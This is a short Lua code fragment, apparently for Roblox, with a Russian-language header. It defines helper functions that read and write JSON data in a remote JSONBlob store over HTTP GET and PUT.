-- ==============================================
-- ФУНКЦИИ ДЛЯ JSONBlob
-- ==============================================

local function jsonblobGet(blobId)
    local url = JSONBLOB_BASE .. blobId
    local success, result = pcall(function()
        return HS:GetAsync(url, true)
    end)
    
    if success and result and result ~= "" then
        local decoded = HS:JSONDecode(result)
        return decoded
    end
    return {}
end

local function jsonblobSet(blobId, data)
    local url = JSONBLOB_BASE .. blobId
    local json = HS:JSONEncode(data)
    
    local success = pcall(function()
        HS:RequestAsync({
            Url = url,
            Method = "PUT",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Accept"] = "application/json"
            },
            Body = json
        })
    end)
    
    return success
end

